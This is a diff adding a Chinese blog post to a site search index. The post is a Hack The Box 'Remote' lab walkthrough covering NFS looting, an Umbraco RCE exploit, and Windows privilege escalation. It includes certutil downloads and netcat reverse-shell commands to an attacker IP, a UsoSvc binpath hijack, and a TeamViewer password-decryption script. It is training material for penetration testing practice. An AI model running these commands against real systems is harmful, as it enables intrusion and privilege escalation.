@@ -801,4 +801,104 @@
         <tag>linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>htb remote复盘</title>
+    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
+<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
+<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
+<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<p>ip：10.10.10.180</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
+<p>一个一个看，开了21端口，用anonymous登陆</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
+<p>没有什么可以利用的，切换到下一个端口</p>
+<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
+<p>然后找到一个登陆点</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >
+
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >
+
+<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
+<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
+<p>有个目录，把它给挂载出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>
+
+<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
+<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
+<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
+<p>找到了一串md5，用网站解密，解出来一串是密码</p>
+<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
+<p>拿着账号密码登陆刚刚的登陆框</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
+<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
+<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
+<p>下载下来后尝试命令执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
+<p>是成功的，接下来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
+<p>下载一个nc到靶机，再调用，本地开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
+<p>成功拿到第一个shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>上传辅助工具winPEASx64.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
+<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
+<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
+<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
+<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
+<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>
+
+<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
+<p>用以下脚本解密</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408173948.png" ></p>
+<p>解出密码:!R3m0te!</p>
+<p>测试这个密码能否登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
+<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
+<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
+<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+        <tag>htb</tag>
+        <tag>windows</tag>
+      </tags>
+  </entry>
 </search>
